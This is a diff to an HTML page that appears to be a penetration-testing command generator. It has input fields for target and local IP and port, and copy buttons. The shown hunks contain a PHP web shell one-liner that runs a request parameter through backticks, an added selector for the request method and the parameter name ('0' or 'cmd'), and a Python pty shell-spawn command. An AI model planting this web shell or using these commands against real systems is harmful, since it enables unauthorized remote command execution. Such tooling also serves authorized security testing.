@@ -14,6 +14,7 @@
   </header>
   <main>
     <p> > <a hrefa href="index.html">Home</a> > <a href="overview.html">OverView</a></p>
+    <!-- environment variable replacer -->
     <h2>Environment Variable Replacer.</h2>
     <p>Replace the environment variables.<br>If you are using environment variables, there is no need to replace them.</p>
     <p>Target IP: <input type="text" name="target-ip" id="target-ip"> <button type="button" id="updateButton1">Reload</button></p>
@@ -22,6 +23,7 @@
     <p>Local IP: <input type="text" name="local-ip" id="local-ip"> <button type="button" id="updateButton4">Reload</button></p>
     <p>Local Port: <input type="text" name="local-port" id="local-port"> <button type="button" id="updateButton5">Reload</button></p>
     
+     <!-- Defalt environment variables replacer -->
     <!-- TODO: Exclude environment variables from the replacer. -->
     <h2>Use as a environment variables.</h2>
     <p>For example, you can use the following variables in your terminal.</p>
@@ -147,10 +149,16 @@
     <p>Backticks</p>
     <p id="command11">$<span id="commandText11">&lt;?=`$_GET[0]`?&gt;</span><button id="copyButton11">Copy</button></p>
     <p>
+      Method: 
       <select>
         <option value="wordlist1">GET</option>
         <option value="wordlist2">POST</option>
         <option value="wordlist3">REQUEST</option>
+      </select>
+      Argument: 
+      <select>
+        <option value="argument1">0</option>
+        <option value="argument2">cmd</option>
       </select>
       <button type="button" id="updateButton2">Reload</button>
     </p>
@@ -161,7 +169,7 @@
     <h3>Spawn Shell.</h3>
     <p id="command12">$<span id="commandText12">python3 -c 'import pty; pty.spawn("/bin/bash")'</span><button id="copyButton12">Copy</button></p>
 
-</main>
+  </main>
 
 <footer>
   <p> > <a hrefa href="index.html">Home</a> > <a href="overview.html">OverView</a></p>
